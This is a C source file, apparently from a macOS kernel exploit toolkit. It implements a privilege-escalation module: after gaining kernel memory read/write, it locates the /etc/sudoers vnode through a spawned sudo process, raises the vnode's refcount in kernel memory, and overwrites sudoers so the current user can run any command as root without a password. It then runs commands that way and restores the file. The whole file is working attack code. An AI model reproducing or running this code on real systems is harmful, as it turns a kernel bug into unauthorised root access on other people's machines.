
#include <spawn.h>
#include <limits.h>
#include <signal.h>
#include <time.h>

#include <sys/stat.h>
#include <sys/fcntl.h>

#include "util/sudo.h"
#include "memory/kmem.h"
#include "slider/kernel.h"
#include "xnu/proc.h"
#include "util/msdosfs.h"
#include "util/log.h"
#include "util/assert.h"
#include "util/vnode.h"
#include "util/misc.h"

#include <macos/kernel.h>


///
/// This module provides functionality for executing commands with root privileges after achieving
/// arbitary kernel memory read / write
///
/// This module works by modifying the `/etc/sudoers` file using `utils/vnode.c` to enable the
/// current user to execute `sudo` commands without authention. The following line will be
/// present in the modified `/etc/sudoers` file for allowing current user to execute commands with
/// root privileges without user interaction (`uid` is the user id of current user)
///
/// #uid ALL = NOPASSWD: ALL
///
/// We need the reference to vnode of `/etc/sudoers` file for using `/utils/vnode.c` to write data to
/// the file. By default the permissions on `/etc/sudoers` file is set such that only root can read /
/// modify this file. So we can't directly open this file and then use kernel memory read to read the
/// vnode pointer from file descriptor of current proc.  Another way to get this is by running the sudo
/// binary with `-i` and `-S` options. This will make `sudo` to wait for password input from stdin.
/// But before waiting, the `sudo` binary will open the `/etc/sudoers` file. This allows us to read
/// the address of `/etc/sudoers` vnode by scanning the open file descriptors of the waiting
/// `sudo` process
///


struct xpl_sudo {
    xpl_vnode_t util_vnode;
    uintptr_t vnode_sudoers;
};


static xpl_sudo_t xpl_sudo_nop = (xpl_sudo_t)UINT64_MAX;


int xpl_sudo_find_sudoers_vnode(uintptr_t proc, uintptr_t* sudoers_vnode) {
    uint32_t num_ofiles;
    xpl_proc_read_fdesc_ofiles(proc, &num_ofiles);
    
    /// Scan the open file descriptors of the process to find the vnode of file with `vn_name`
    /// equal to "sudoers"
    for (int i=3; i<num_ofiles; i++) {
        uintptr_t vnode;
        int error = xpl_proc_find_fd_data(proc, i, &vnode);
        xpl_assert_err(error);
        
        const char file_name[] = "sudoers";
        char buffer[sizeof(file_name)];
        
        uintptr_t vnode_name = xpl_kmem_read_uint64(vnode, TYPE_VNODE_MEM_VN_NAME_OFFSET);
        if (!vnode_name || !xpl_vm_kernel_address_valid(vnode_name)) {
            continue;
        }
        
        xpl_kmem_read(buffer, vnode_name, 0, sizeof(buffer));
        
        if (memcmp(buffer, file_name, sizeof(file_name)) == 0) {
            *sudoers_vnode = vnode;
            return 0;
        }
    }
    
    return ENOENT;
}


_Bool xpl_sudo_check_is_privileged(void) {
    /// Running the sudo command with `non-interactive` flag will fail if the current user
    /// cannot execute root command without interaction
    const char* argv[] = {
        "/usr/bin/sudo",
        "-n",
        "/usr/bin/tty",
        NULL
    };
    
    int fd_null = open("/dev/null", O_RDWR);
    xpl_assert_errno(fd_null < 0);
    
    posix_spawn_file_actions_t file_actions;
    posix_spawn_file_actions_init(&file_actions);
    /// Redirect messages from sudo to `/dev/null`
    posix_spawn_file_actions_adddup2(&file_actions, fd_null, STDERR_FILENO);
    posix_spawn_file_actions_adddup2(&file_actions, fd_null, STDOUT_FILENO);
    pid_t pid;
    int error = posix_spawn(&pid, "/usr/bin/sudo", &file_actions, NULL, (char**)argv, NULL);
    xpl_assert_err(error);
    posix_spawn_file_actions_destroy(&file_actions);
    
    pid_t res;
    int stat_loc = 0;
    do {
        res = waitpid(pid, &stat_loc, 0);
    } while ((res < 0 && errno == EINTR) || !WIFEXITED(stat_loc));
    xpl_assert_cond(res, ==, pid);
    
    close(fd_null);
    
    /// If the `sudo` process exited with status zero, the current user is privileged to run
    /// root commands without user intraction
    return WEXITSTATUS(stat_loc) == 0;
}


xpl_sudo_t xpl_sudo_create(void) {
    if (xpl_sudo_check_is_privileged()) {
        /// Current user already can run root commands without user intraction, we don't
        /// have to modify the sudoers file to execute commands with root privilege.
        xpl_log_debug("user %d can already run sudo without user interation, returning sudo_nop", getuid());
        return xpl_sudo_nop;
    }
    
    /// Run sudo with `login` and `stdin` flag set. This will make sudo wait for password input
    /// from stdin
    const char* argv[] = {
        "/usr/bin/sudo",
        "-i",
        "-S",
        NULL
    };
    
    int fd_null = open("/dev/null", O_RDWR);
    int pfds[2];
    int res = pipe(pfds);
    xpl_assert_errno(res);
    
    posix_spawn_file_actions_t file_actions;
    posix_spawn_file_actions_init(&file_actions);
    /// Do not use stdin of current process to receive password
    posix_spawn_file_actions_addclose(&file_actions, pfds[1]);
    posix_spawn_file_actions_adddup2(&file_actions, pfds[0], STDIN_FILENO);
    /// Redirect sudo outputs to /dev/null
    posix_spawn_file_actions_adddup2(&file_actions, fd_null, STDOUT_FILENO);
    posix_spawn_file_actions_adddup2(&file_actions, fd_null, STDERR_FILENO);

    pid_t sudo_pid;
    int error = posix_spawn(&sudo_pid, "/usr/bin/sudo", &file_actions, NULL, (char**)argv, NULL);
    xpl_assert_err(error);
    posix_spawn_file_actions_destroy(&file_actions);
    close(pfds[0]);
        
    uintptr_t sudo_proc;
    error = xpl_proc_find(sudo_pid, &sudo_proc);
    xpl_assert_err(error);
    
    /// Read the vnode associated to the sudoers file from `sudo_proc`
    uintptr_t sudoers_vnode;
    int max_tries = 5 * 1000 / 10;
    do {
        xpl_sleep_ms(10);
        error = xpl_sudo_find_sudoers_vnode(sudo_proc, &sudoers_vnode);
    } while (error == ENOENT && --max_tries > 0);
    xpl_assert_err(error);
    
    /// Take additional reference to vnode so that it won't be released.
    uint32_t v_usecount = xpl_kmem_read_uint32(sudoers_vnode, TYPE_VNODE_MEM_V_USECOUNT_OFFSET);
    xpl_kmem_write_uint32(sudoers_vnode, TYPE_VNODE_MEM_V_USECOUNT_OFFSET, v_usecount + 2);
    
    kill(sudo_pid, SIGKILL);
    close(pfds[1]);
    close(fd_null);
    
    xpl_sudo_t util = malloc(sizeof(struct xpl_sudo));
    util->util_vnode = xpl_vnode_create();
    util->vnode_sudoers = sudoers_vnode;
    return util;
}


static const char xpl_sudo_sudoers_file_format[] = "\
Defaults env_reset\n\
Defaults env_keep += \"CHARSET LANG LANGUAGE LC_ALL HOME\"\n\
Defaults lecture_file = \"/etc/sudo_lecture\"\n\
root ALL = (ALL) ALL\n\
%%admin ALL = (ALL) ALL\n\
#%d ALL = NOPASSWD: ALL\n\
#includedir /private/etc/sudoers.d\n\
";


void xpl_sudo_modify_sudoers(xpl_sudo_t util, size_t sudoers_size) {
    char* buffer = malloc(sudoers_size);
    size_t len = snprintf(buffer, sudoers_size, xpl_sudo_sudoers_file_format, getuid());
    xpl_assert_cond(len, <, sudoers_size);
    /// `xpl_vnode_write` will not truncate the file to size of data. So we fill the buffer with
    /// '\n' character to match the write data size with sudoers file size
    memset(&buffer[len], '\n', sudoers_size - len);
    xpl_vnode_write_user(util->util_vnode, util->vnode_sudoers, buffer, sudoers_size);
    free(buffer);
}


int xpl_sudo_run_cmd(const char* cmd, const char* argv[], size_t argc) {
    const char* cmd_args[argc + 3];
    cmd_args[0] = "/usr/bin/sudo";
    cmd_args[1] = "-n";
    cmd_args[2] = cmd;
    for (int i=0; i<argc; i++) {
        cmd_args[i + 3] = argv[i];
    }
    cmd_args[argc + 3] = NULL;
    
    pid_t cmd_pid;
    int error = posix_spawn(&cmd_pid, "/usr/bin/sudo", NULL, NULL, (char**)cmd_args, NULL);
    xpl_assert_err(error);
    
    int stat_loc = 0;
    pid_t wait_pid;
    do {
        wait_pid = waitpid(cmd_pid, &stat_loc, 0);
    } while ((wait_pid < 0 && errno == EINTR) || (wait_pid >= 0 && !WIFEXITED(stat_loc)));
    xpl_assert_cond(wait_pid, ==, cmd_pid);
    
    return WEXITSTATUS(stat_loc);
}


int xpl_sudo_run(xpl_sudo_t util, const char* cmd, const char* argv[], size_t argc) {
    if (util == xpl_sudo_nop) {
        xpl_assert(xpl_sudo_check_is_privileged());
        return xpl_sudo_run_cmd(cmd, argv, argc);
    }
    
    struct stat sudoers_stat;
    int res = stat("/etc/sudoers", &sudoers_stat);
    xpl_assert_errno(res);

    /// Backup sudoers file
    char* sudoers_backup = malloc(sudoers_stat.st_size);
    xpl_vnode_read_user(util->util_vnode, util->vnode_sudoers, sudoers_backup, sudoers_stat.st_size);
    
    /// Allow current user to run root commands without user interaction
    xpl_sudo_modify_sudoers(util, sudoers_stat.st_size);
    
    /// Run the command
    int exit_status = xpl_sudo_run_cmd(cmd, argv, argc);
    
    /// Restore sudoers file
    xpl_vnode_write_user(util->util_vnode, util->vnode_sudoers, sudoers_backup, sudoers_stat.st_size);
    free(sudoers_backup);
    
    return exit_status;
}


void xpl_sudo_destroy(xpl_sudo_t* util_p) {
    xpl_sudo_t util = *util_p;
    if (util != xpl_sudo_nop) {
        xpl_vnode_destroy(&util->util_vnode);
        uint32_t v_usecount = xpl_kmem_read_uint32(util->vnode_sudoers, TYPE_VNODE_MEM_V_USECOUNT_OFFSET);
        xpl_assert_cond(v_usecount, >=, 2);
        free(util);
    }
    *util_p = NULL;
}
